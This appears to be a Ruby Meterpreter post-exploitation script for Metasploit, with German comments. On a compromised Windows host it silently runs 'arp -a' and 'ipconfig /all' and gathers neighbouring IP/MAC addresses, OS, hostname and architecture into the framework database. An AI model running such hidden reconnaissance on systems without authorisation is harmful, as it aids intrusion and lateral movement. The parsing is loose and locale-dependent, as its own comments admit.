require 'pp'

#dmke:
# Weitere Kleinigkeiten:
# * Zeile 20 match auch auf 999.999.999.999
# * Zeile 22 würde auch "xj-z-?.-@3-..." matchen "\S = nicht Whitespace"

# Function for running arp -a on the owned host
def get_arp_a_infos
  hosts = Array.new
  index = 0
  cmd = 'arp -a'
  r, cmdout = '', ''  
  r = @client.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
  while d = r.channel.read
    cmdout << d
  end 
  cmdout.split("\n").each do |line|
    # extract ip-adresses
    b = line.scan /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/
    # extract MAC-adresses
    c = line.scan /\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}/
    # write found ip- and mac adress in database           
    if not b.empty? and not c.empty?
      c = c.first.to_s.gsub('-',':')
      hosts[index] = {
        :workspace => session.framework.db.workspace,
        :host => b.first.to_s,
        :mac  => c
      }
    index += 1
    end
  end
  r.channel.close
  r.close
  hosts
end

# TODO Parsen ist nicht Sprachunabhängig
def get_host_infos
  hostdata = Hash.new
  hostdata[:workspace] = session.framework.db.workspace
  r, cmdout = '', '' 
  r = @client.sys.process.execute('ipconfig /all', nil, {'Hidden' => true, 'Channelized' => true})
  while d = r.channel.read
    cmdout << d
  end 
  
  cmdout.split("\n").each do |line|
    if line.include? "Physikalische Adresse"
      hostdata[:mac] = (line.split(":")[1]).strip
    end
    if line.include? "IP-Adresse"
      hostdata[:host] = (line.split(":")[1]).strip
    end
  end
    
  sysinfo = client.sys.config.sysinfo
  hostdata[:os_name]       = sysinfo['OS']
  hostdata[:name] = sysinfo['Computer']
  hostdata[:arch]     = sysinfo['Architecture']
  hostdata[:os_lang] = sysinfo['System Language']
   
  hostdata
end

def write_db host
  if session.framework.db.active
    session.framework.db.report_host host
  end
end

get_arp_a_infos.each do |host|
  write_db host
end

write_db get_host_infos